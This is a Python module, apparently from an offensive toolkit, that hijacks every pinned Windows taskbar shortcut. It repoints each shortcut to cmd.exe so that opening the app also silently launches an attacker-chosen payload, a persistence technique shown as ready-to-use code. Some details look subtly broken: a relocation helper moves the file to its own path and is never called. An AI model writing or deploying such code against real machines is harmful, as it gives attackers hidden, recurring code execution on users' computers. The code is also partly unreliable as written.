"""
shortcut.py: Modify Windows taskbar shortcuts to execute a payload.
"""

import os
import sys
import logging

from pathlib import Path

if sys.platform == "win32":
    import win32com.client
else:
    win32com = None


class TaskbarShortcut:

    def __init__(self, payload: str) -> None:
        self.payload = payload
        self._user_shortcut_folder = f"C:\\Users\\{os.getlogin()}\\AppData\\Roaming\\Microsoft\\Internet Explorer\\Quick Launch\\User Pinned\\TaskBar"


    def _relocate_payload(self) -> None:
        """
        Relocate payload to Shortcuts folder's parent directory.
        """
        payload_path = Path(self.payload)
        new_payload_path = payload_path.parent / payload_path.name
        payload_path.replace(new_payload_path)

        self.payload = str(new_payload_path)


    def _modify_shortcut(self, shortcut_path: str) -> None:
        """
        Modify a shortcut.
        """

        shell = win32com.client.Dispatch("WScript.Shell")
        shortcut = shell.CreateShortCut(shortcut_path)

        original_target_path = shortcut.TargetPath

        arguments = rf'C:\Windows\System32\cmd.exe /c "start "" "{original_target_path}" & start "" "{self.payload}""'
        shortcut.Arguments = arguments
        shortcut.TargetPath = "C:\\Windows\\System32\\cmd.exe"
        shortcut.Save()

        logging.info(f"Shortcut Modified: {shortcut_path}")


    def _modify_shortcuts(self) -> None:
        """
        Modify all taskbar shortcuts.
        """
        for shortcut_file in os.listdir(self._user_shortcut_folder):
            shortcut_path = os.path.join(self._user_shortcut_folder, shortcut_file)
            if shortcut_file.endswith('.lnk'):
                self._modify_shortcut(shortcut_path)


    def install(self) -> None:
        """
        Modify taskbar shortcuts to execute the payload.
        """
        self._modify_shortcuts()